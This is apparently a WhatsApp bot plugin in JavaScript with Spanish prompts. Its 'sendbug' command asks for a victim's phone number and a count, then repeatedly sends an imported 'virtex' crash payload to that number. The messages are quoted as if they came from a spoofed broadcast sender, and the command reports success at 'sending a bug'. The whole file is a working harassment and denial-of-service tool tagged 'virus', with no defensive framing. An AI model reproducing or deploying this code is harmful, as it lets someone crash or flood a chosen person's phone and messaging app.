//By https://github.com/DIEGO-OFC

import virtex from "../virtex/index.js";

let handler = async (m, {conn, text, usedPrefix, command, isOwner, isPrems}) => {
  if (!(isOwner || isPrems)) {
    global.dfail("premium", m, conn);
    throw false;
  }
  if (!text)
    throw `_. ᩭ✎A quién quiere atacar?_\n _ejemplo de uso :_\n _${usedPrefix + command} número_\n *ejemplo: ${usedPrefix + command} +58******* .*`;
  let [orang, jumlah] = text.split(",");
  if (!jumlah) throw ".\n\n_. ᩭ✎introduce la cantidad_\n*.sbug +58416671837x...., 10*";
  m.reply("_Procesando..._");
  let who;
  try {
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : orang.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    else who = orang.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (who.length <= 20) throw "_. ᩭ✎Responder o etiquetar a las personas que quieren ser atacadas_";
    conn.logger.info(`\nVictima: ${who}\nCantidad: ${jumlah}`);
    for (let i = jumlah; i > 1; i--) {
      if (i !== 0)
        await conn.sendMessage(
          who,
          {text: virtex},
          {
            quoted: {
              key: {
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "0@s.whatsapp.net@broadcast",
              },
              message: {
                conversation: virtex,
              },
            },
          }
        );
    }
    conn.reply(m.chat, `_. ᩭ✎Enviando con éxito un bug a @${who.split("@")[0]}_`, m, {mentions: [who]});
  } catch (e) {
    console.error(e);
    throw e;
  }
};
handler.help = ["sendbug", "sbug"].map((v) => v + " <nomor>");
handler.tags = ["virus"];
handler.command = /^s(end)?bug$/i;

handler.premium = false;
handler.owner = true;

export default handler;
